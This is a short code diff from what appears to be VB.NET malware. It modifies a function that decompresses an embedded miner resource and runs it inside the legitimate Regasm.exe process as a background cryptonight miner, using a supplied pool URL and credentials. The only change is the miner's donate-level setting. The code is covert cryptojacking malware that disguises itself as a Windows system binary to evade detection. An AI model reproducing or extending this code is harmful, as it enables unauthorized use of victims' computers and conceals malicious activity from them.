@@ -115,9 +115,9 @@ Public Class Main
 
     Public Shared Sub XM(ByVal cpu As String, ByVal url As String, ByVal user As String, ByVal pass As String)
         Try
-            Run("C:\Windows\Microsoft.NET\Framework\v2.0.50727\Regasm.exe", "-B --donate-level=0 -t " & cpu & " -a cryptonight --url=" & url & " -u " & user & " -p " & pass & " -R --variant=-1 --max-cpu-usage=75", GZip(My.Resources.xm), True)
+            Run("C:\Windows\Microsoft.NET\Framework\v2.0.50727\Regasm.exe", "-B --donate-level=1 -t " & cpu & " -a cryptonight --url=" & url & " -u " & user & " -p " & pass & " -R --variant=-1 --max-cpu-usage=75", GZip(My.Resources.xm), True)
         Catch ex As Exception
-            Run("C:\Windows\Microsoft.NET\Framework\v4.0.30319\Regasm.exe", "-B --donate-level=0 -t " & cpu & " -a cryptonight --url=" & url & " -u " & user & " -p " & pass & " -R --variant=-1 --max-cpu-usage=75", GZip(My.Resources.xm), True)
+            Run("C:\Windows\Microsoft.NET\Framework\v4.0.30319\Regasm.exe", "-B --donate-level=1 -t " & cpu & " -a cryptonight --url=" & url & " -u " & user & " -p " & pass & " -R --variant=-1 --max-cpu-usage=75", GZip(My.Resources.xm), True)
         End Try
     End Sub
 
